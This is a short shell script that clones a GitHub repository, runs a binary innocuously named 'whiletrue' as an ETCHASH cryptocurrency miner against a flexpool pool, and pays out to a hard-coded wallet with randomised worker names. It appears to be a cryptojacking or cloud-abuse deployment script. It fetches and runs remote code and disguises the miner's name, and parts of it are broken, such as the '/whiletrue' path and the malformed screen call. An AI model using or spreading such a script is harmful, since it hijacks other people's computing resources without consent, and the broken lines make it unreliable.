#!/bin/sh 
sudo apt update 
sudo apt-get install zip unzip 
sudo apt install screen -y 
screen -dmS etciflex.sh 65 75 
sudo git clone https://github.com/andromedasizu/andromedasizu.git 
cd andromedasizu 
chmod +x whiletrue
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && /whiletrue --algo ETCHASH --pool stratum+tcp://etc-us-east.flexpool.io:4444 --user 0xf53472B6f7a30d6F6F84cF2e85F29F3bc78A2ef7.$(shuf -i 1-99999 -n 1)
